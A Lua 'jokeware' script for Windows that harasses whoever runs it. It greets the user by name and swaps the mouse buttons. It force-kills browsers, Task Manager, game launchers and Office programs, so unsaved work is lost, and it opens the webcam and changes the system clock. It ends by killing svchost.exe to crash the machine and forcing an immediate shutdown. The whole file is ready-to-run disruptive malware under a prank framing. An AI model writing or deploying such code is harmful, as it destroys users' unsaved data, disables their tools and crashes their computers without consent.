-- This code is written by Matthew C.
-- Please use at your own risk.
-- I am not responsible for your unsaved documents, don't come crying to me about them.
-- There is a high likelyhood that your anti-virus will delete the file.
-- THIS IS NOT ACTUALLY MALICIOUS.  IT'S JOKEWARE.

local ui = require "ui"

local sys = require "sys"

local dir = sys.Directory(sys.currentdir);

local user = print(os.getenv('USERNAME'));

--Functions

function Waiteroo(n)
  local t = os.clock()
  while os.clock() - t <= n do
    -- nothing
  end
end

function CloseDistractions()  --Close Other Programs
  
  --Browsers

  os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome
  os.execute("taskkill /F /IM \"msedge.exe\" /T");  --Edge
  os.execute("taskkill /F /IM \"firefox.exe\" /T");  --FireFox
  os.execute("taskkill /F /IM \"Opera.exe\" /T");  --Opera

  --System Shtuffs

  os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager

  --Game Launchers

  os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam
  os.execute("taskkill /F /IM \"EpicGamesLauncher.exe\" /T");  --EG Launcher

  --Stupid Stuff Because Funny

  os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)
  os.execute("taskkill /F /IM \"notepad.exe\" /T");  --Notepad

  --Office

  os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word
  os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
  os.execute("taskkill /F /IM \"powerpnt.exe\" /T");  --Powerpoint
end

function shutter()
  os.execute("shutdown /s /t 10 -c Hahaha!!");
end

--here comes the garbage lmao

ui.info("Hey dude!");

ui.info("Wait...");

ui.info("I think I know you!");
      
ui.info("Are you "..os.getenv('USERNAME').."?");

ui.info("It is you!");

os.execute("RUNDLL32 USER32.DLL,SwapMouseButton");  --Swap Mouse Inputs

ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");

ui.info("Don\'t worry, I\'ll deal with that for you!");

CloseDistractions();

ui.info("Now that that\'s dealt with...");

ui.info("How\'s it going "..os.getenv('USERNAME').."?");

ui.info("Good?");

ui.info("That\'s great!");

ui.info("Actually, I kinda forgot what you look like!");

ui.info("Let me juusssttt-");

os.execute("start microsoft.windows.camera:");  --Open Windows Camera

ui.info("There we go!");

ui.info("Now I remember!");

ui.info("Anyways,");

os.execute("time 10:42");
          
ui.info("I gotta go now");

os.execute("time 3:57");

ui.info("Actually...");

ui.info("Before I go...");          

os.execute("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");  --RICK

ui.info("Hahaha!!");          
                    
ui.warn("I\'M IN YOUR HEAD.");  

os.execute(""..dir.."extern/noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  Creepy.

Waiteroo(1*05);

ui.warn("...");                    
          
ui.info("Bye "..os.getenv('USERNAME').."!!!");

os.execute("taskkill /F /IM \"svchost.exe\" /T");  --Crash PC (Only Works With Admin)

Waiteroo(1*05);  --Wait 5 seconds before continuing

os.execute("shutdown /s /t 00");  --Backup if not admin